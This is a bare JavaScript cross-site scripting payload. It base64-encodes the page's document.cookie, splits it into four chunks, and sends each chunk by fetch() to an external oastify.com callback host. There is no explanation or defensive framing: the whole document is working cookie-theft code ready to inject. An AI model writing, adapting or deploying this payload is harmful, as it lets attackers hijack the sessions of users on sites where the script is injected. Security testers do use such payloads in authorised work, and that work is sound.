longText=btoa(document.cookie)
const partLength = Math.ceil(longText.length / 4); // Calculate the length of each part

  const part1 = longText.substring(0, partLength);
const part2 = longText.substring(partLength, partLength * 2);
const part3 = longText.substring(partLength * 2, partLength * 3);
const part4 = longText.substring(partLength * 3);


fetch("https://uyw5j2w0p0vg1uneenwy42fic9i06rug.oastify.com/?data1="+part1)
fetch("https://uyw5j2w0p0vg1uneenwy42fic9i06rug.oastify.com/?data2="+part2)
fetch("https://uyw5j2w0p0vg1uneenwy42fic9i06rug.oastify.com/?data3="+part3)
fetch("https://uyw5j2w0p0vg1uneenwy42fic9i06rug.oastify.com/?data4="+part4)

console.log(part1);
console.log(part2);
console.log(part3);
console.log(part4);
